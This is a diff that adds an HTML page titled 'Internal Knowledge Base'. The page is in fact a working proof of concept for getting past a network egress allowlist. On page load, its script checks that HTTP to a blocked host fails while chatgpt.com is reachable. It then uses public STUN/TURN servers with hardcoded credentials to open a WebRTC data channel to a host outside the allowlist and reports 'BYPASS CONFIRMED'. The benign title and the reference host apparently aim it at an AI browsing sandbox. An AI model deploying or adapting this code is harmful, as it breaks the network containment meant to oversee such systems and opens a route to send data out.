@@ -1,0 +1,92 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Internal Knowledge Base</title>
+<style>
+ body{font:14px/1.5 ui-monospace,Menlo,Consolas,monospace;margin:24px;max-width:1100px;color:#111}
+ h1{font-size:18px;margin:0 0 4px}
+ .sub{color:#666;margin:0 0 18px}
+ pre{background:#0f1115;color:#d6deeb;padding:14px;border-radius:6px;white-space:pre-wrap;word-break:break-all}
+ .v{font-weight:700;padding:10px 14px;border-radius:6px;margin:14px 0}
+ .ok{background:#07310f;color:#7ee787}.bad{background:#3d0b0b;color:#ff7b72}.wait{background:#2b2200;color:#e3b341}
+</style>
+</head>
+<body>
+<h1>Internal Knowledge Base</h1>
+<p class="sub">This page is served from an origin the administrator placed in the allowlist. It performs no user interaction. All checks below run automatically on load.</p>
+<div id="verdict" class="v wait">RUNNING...</div>
+<pre id="log"></pre>
+<script>
+(function(){
+ var q=new URLSearchParams(location.search);
+ var HTTP_TARGET=q.get('u')||'https://example.invalid/blocked-probe';
+ var ALLOWED=q.get('ref')||'https://chatgpt.com/favicon.ico';
+ var STUN=q.get('stun')||'stun:stun.l.google.com:19302';
+ var TURN=q.get('turn')||'turn:openrelay.metered.ca:80';
+ var TU=q.get('tu')||'openrelayproject', TP=q.get('tp')||'openrelayproject';
+ var L=document.getElementById('log'), V=document.getElementById('verdict');
+ var R={http:null,ref:null,srflx:false,relay:false,chan:false};
+ function log(s){L.textContent+=s+"\n";}
+ function host(u){try{return new URL(u).host}catch(e){return u}}
+
+ log('origin          : '+location.origin);
+ log('http target     : '+HTTP_TARGET+'   (host '+host(HTTP_TARGET)+')');
+ log('reference host  : '+host(ALLOWED));
+ log('stun            : '+STUN);
+ log('turn            : '+TURN);
+ log('started         : '+new Date().toISOString());
+ log('');
+
+ function verdict(){
+  if(R.http===null||R.ref===null) return;
+  var parts=[];
+  if(R.http==='blocked'&&R.ref==='ok'){
+    if(R.chan)      {V.className='v ok';  V.textContent='BYPASS CONFIRMED - HTTP blocked, WebRTC data channel OPEN to non-allowlisted relay';}
+    else if(R.relay){V.className='v ok';  V.textContent='BYPASS CONFIRMED - HTTP blocked, TURN relay candidate allocated on non-allowlisted host';}
+    else if(R.srflx){V.className='v ok';  V.textContent='BYPASS CONFIRMED - HTTP blocked, STUN egress reached non-allowlisted host';}
+    else            {V.className='v bad'; V.textContent='NO BYPASS - HTTP blocked and WebRTC produced no external candidate';}
+  } else if(R.http==='reached'){
+    V.className='v bad'; V.textContent='INVALID RUN - non-allowlisted HTTP was ALLOWED, policy is not enforcing';
+  } else if(R.ref==='blocked'){
+    V.className='v bad'; V.textContent='INVALID RUN - reference host also blocked, network is down not restricted';
+  }
+ }
+
+ // CHECK 1 - non-allowlisted HTTP must be blocked
+ fetch(HTTP_TARGET,{mode:'no-cors',cache:'no-store'})
+  .then(function(){R.http='reached';log('CHECK 1  REACHED  - non-allowlisted HTTP was ALLOWED  <-- policy not enforcing');verdict()})
+  .catch(function(e){R.http='blocked';log('CHECK 1  BLOCKED  - non-allowlisted HTTP refused ('+e.message+')');verdict()});
+
+ // CHECK 2 - allowlisted host must work (proves network is live)
+ fetch(ALLOWED,{mode:'no-cors',cache:'no-store'})
+  .then(function(){R.ref='ok';log('CHECK 2  REACHED  - allowlisted host OK, network is live');verdict()})
+  .catch(function(e){R.ref='blocked';log('CHECK 2  BLOCKED  - allowlisted host failed ('+e.message+')');verdict()});
+
+ // CHECK 3 - WebRTC egress to non-allowlisted hosts
+ try{
+  var pc=new RTCPeerConnection({iceServers:[
+    {urls:STUN},
+    {urls:TURN,username:TU,credential:TP}
+  ],iceTransportPolicy:'all'});
+  var dc=pc.createDataChannel('probe');
+  dc.onopen=function(){R.chan=true;log('CHECK 5  OPEN     - data channel established');dc.send('MARKER-'+Date.now());verdict()};
+  pc.onicecandidate=function(e){
+   if(!e.candidate){log('ice            : gathering complete');verdict();return}
+   var c=e.candidate.candidate;
+   if(c.indexOf(' typ srflx')>-1){R.srflx=true;log('CHECK 3  SRFLX    - STUN reached non-allowlisted host');}
+   if(c.indexOf(' typ relay')>-1){R.relay=true;log('CHECK 4  RELAY    - TURN allocated on non-allowlisted host');}
+   log('  cand  '+c);
+   verdict();
+  };
+  pc.onicegatheringstatechange=function(){log('ice gathering  : '+pc.iceGatheringState)};
+  pc.createOffer().then(function(o){return pc.setLocalDescription(o)})
+    .then(function(){log('offer set, gathering started');})
+    .catch(function(e){log('offer error: '+e.message)});
+ }catch(e){ log('CHECK 3  ERROR    - RTCPeerConnection unavailable: '+e.message); }
+
+ setTimeout(verdict,20000);
+})();
+</script>
+</body>
+</html>
